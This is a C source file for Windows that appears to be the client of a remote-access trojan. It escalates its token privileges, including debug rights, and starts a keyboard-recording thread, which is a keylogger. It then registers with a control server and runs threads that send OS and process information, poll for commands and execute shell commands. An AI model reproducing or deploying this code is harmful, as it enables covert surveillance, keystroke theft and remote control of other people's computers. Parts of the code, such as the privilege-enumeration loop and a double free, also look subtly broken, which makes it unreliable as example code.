#ifndef UNICODE
#define UNICODE
#endif



#include <stdio.h>
#include <wchar.h>
#include <lmerr.h>
#include <Windows.h>
#include "util.h"
#include "server.h"
#include "win_misc.h"
#include "proxy_info.h"
#include "my_string.h"
#include "curlhelper.h"
#include "thutil.h"



 
#pragma comment(lib, "Netapi32.lib")


void RunSelfAsAdmin(LPCWSTR programName)
{
    SHELLEXECUTEINFOW exInfo;
    exInfo.cbSize = sizeof(exInfo);
    exInfo.lpVerb = L"runas";
    exInfo.fMask = SEE_MASK_DEFAULT;
    exInfo.lpDirectory = nil;
    exInfo.lpClass = nil;
    exInfo.lpFile = programName;
    exInfo.lpParameters = nil;
    exInfo.nShow = SW_NORMAL;
    (void)ShellExecuteExW(&exInfo);
}



BOOL IsUserAdmin(VOID)
{
    BOOL b;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    b = AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &AdministratorsGroup );

    if(b)
    {
        if (!CheckTokenMembership( NULL, AdministratorsGroup, &b))
        {
             b = FALSE;
        }
        FreeSid(AdministratorsGroup);
    }

    return(b);
}

BOOL EnablePrivilege(PTCHAR privilegeName, HANDLE token)
{
    LUID privId;
    if (!LookupPrivilegeValue(nil, privilegeName, &privId)) {
        return FALSE;
    }

    TOKEN_PRIVILEGES privToEnable;
    privToEnable.PrivilegeCount = 1;
    privToEnable.Privileges[0].Luid = privId;
    privToEnable.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    if (!AdjustTokenPrivileges(token, FALSE, &privToEnable, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) return FALSE;
    
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
          return FALSE;
    } 

    return TRUE;
}

PTCHAR GetPrivilegeName(LUID* luid)
{
    DWORD sz = MAX_PATH * sizeof(WCHAR);
    PTCHAR buf = NewMemory(TCHAR, sz);
    if (LookupPrivilegeName(nil, luid, buf, &sz))
    {
        #ifdef UNICODE
            buf[sz] = L'\0';
        #else 
            buf[sz] = 0;
        #endif
        return buf;
    }

    free(buf);

    return NULL;
}

void EnableAllPrivileges(HANDLE token)
{
    DWORD bRequired = 0;
    if (!GetTokenInformation(token, TokenPrivileges, NULL, 0, &bRequired)) {

        PTOKEN_PRIVILEGES data = NewMemory(TOKEN_PRIVILEGES, bRequired);

        if (GetTokenInformation(token, TokenPrivileges, data, bRequired , &bRequired)) {

            const DWORD count = bRequired / sizeof(TOKEN_PRIVILEGES);
            PTOKEN_PRIVILEGES nxt = data;

            for (DWORD i = 0ul; i < count; i++) {
                LUID_AND_ATTRIBUTES * pLuidAndAttrs = &nxt->Privileges[0];

                if (!(pLuidAndAttrs->Attributes & SE_PRIVILEGE_ENABLED))
                {
                    PTCHAR privName = GetPrivilegeName(&pLuidAndAttrs->Luid);
                    EnablePrivilege(privName, token);
                    FreeMemoryBlock(privName);
                }
                nxt++;
            }
        }

        free(data);

    }
}

boolean EnablePrivilegeVerNew(HANDLE token, PTCHAR privilegeName)
{
    TOKEN_PRIVILEGES tokenPrivileges;
    LUID luid;
    if (!LookupPrivilegeValue(NULL, privilegeName, &luid)) {
        printf("Failed to lookup privilege. Error: %lu\n", GetLastError());
        return FALSE;
    }

    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luid;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(token, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("Failed to adjust privileges. Error: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

void PrintNameAndLuid(PLUID_AND_ATTRIBUTES pLuidAndAttributes)
{
    TCHAR buf[MAX_PATH] = {0};
    DWORD size = sizeof(buf);
    if (LookupPrivilegeName(NULL, &pLuidAndAttributes->Luid, buf,&size)) {
        buf[size] = '\0';

        #ifdef UNICODE
            wprintf(L"(%d-%d) [ %s ] enabled: %s\n", pLuidAndAttributes->Luid.HighPart, pLuidAndAttributes->Luid.LowPart, buf, 
            (pLuidAndAttributes->Attributes & SE_PRIVILEGE_ENABLED) ? L"true" : L"false");
        #else
            printf("(%d-%d) [ %s ] enabled: %s\n", pLuidAndAttributes->Luid.HighPart, pLuidAndAttributes->Luid.LowPart, buf, 
            (pLuidAndAttributes->Attributes & SE_PRIVILEGE_ENABLED) ? "true" : "false");
        #endif

        
    }
}

void PrintAllPrivileges(HANDLE token)
{

    DWORD bRequired = 0;
    if (!GetTokenInformation(token, TokenPrivileges, NULL, 0, &bRequired)) {

        PTOKEN_PRIVILEGES data = NewMemory(TOKEN_PRIVILEGES, bRequired);

        if (GetTokenInformation(token, TokenPrivileges, data, bRequired , &bRequired)) {

            PTOKEN_PRIVILEGES nxt = data;
            printf("\r\n");
            for (DWORD i = 0ul; i < data->PrivilegeCount; i++) {
                PrintNameAndLuid(&nxt->Privileges[0]);
                nxt++;
            }
            printf("\r\n");
        }

        free(data);
    }
}

boolean AddDebugAccountRight()
{
    void *pHandle = GetPolicyHandle();

    if (pHandle) {

        
        DWORD sidSize = sizeof(SID), domainSize = MAX_PATH;
        size_t count = 0;
        wchar_t * uname = GetCurrentUserName(&count);
        TCHAR domainName[MAX_PATH];
        
        SID_NAME_USE sidType;
        if (!LookupAccountName(NULL, uname, NULL, &sidSize, domainName, &domainSize,&sidType)) {

            PSID userSid = (PSID)LocalAlloc(ZERO, sidSize);
            if (LookupAccountName(NULL, uname, userSid, &sidSize, domainName, &domainSize,&sidType)) {
                if (EnableDebugPrivelege(pHandle, userSid)) {
                    ClosePolicyHandle(pHandle);
                    LocalFree(userSid);
                    free(uname);
                    return true;
                }
            }

            ClosePolicyHandle(pHandle);
            LocalFree(userSid);
            free(uname);
        }

        free(uname);
    }

    ClosePolicyHandle(pHandle);

    return false;
}


int StartApplicationLoop(integer_t argc, char ** argv) 
{

    HANDLE processToken = NULL;
    integer_t code = -1;
    pclient_t client = NULL;
    long clientId;

    (void)argv;
    (void)argc;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY_SOURCE, &processToken)) {
        goto clean;
    }
    
    (void)AddDebugAccountRight();

    EnablePrivilege(SE_DEBUG_NAME, processToken);
    PrintAllPrivileges(processToken);
    EnableAllPrivileges(processToken);
    PrintAllPrivileges(processToken);

    if (!InitializeWSock()) {
        printf("init of winsock failed!\n");
        goto clean;
    }

    if (CreateKeyBoardRecordingThread()) {
        printf("failed to create record thread!\n");
        goto clean;
    }

    InitCurl();
    
    client = RegisterClient();

    if (client == NULL) {
        printf("Couldn't get client");
        goto clean;
    }

    clientId = ClientGetID(client);

    if (clientId != INVALID_ID) {

        printf("starting sending information ...\n");

        if (CreateNewThread(PostOSInfo, &clientId)) {
            printf("[OK] started OS sending thread ...\n");
        }

        if (CreateNewThread(PostProcesses, &clientId)) {
            printf("[OK] started processes sending thread ...\n");
        }

        if (CreateNewThread(PollAboutCommand, &client)) {
            printf("[OK] started polling ...\n");
        }

        if (CreateNewThread(ClientKeepAlive, client)) {
            printf("[OK] started keep alive service ...\n");
        }

        if (CreateNewThread(ShellCommandExecutor, client)) {
            printf("[OK] started listening for shell commands ...\n");
        }

    } else {
        printf("Couldn't get ID\n");
        goto clean;
    }

    code = RunServer(9999, "127.0.0.1");

clean:
    DestroyCurl();
    CloseHandle(processToken);
    ClientFree(client);
    return code;
}


int main(int argc, char ** argv)
{ 
    return StartApplicationLoop(argc, argv);
}
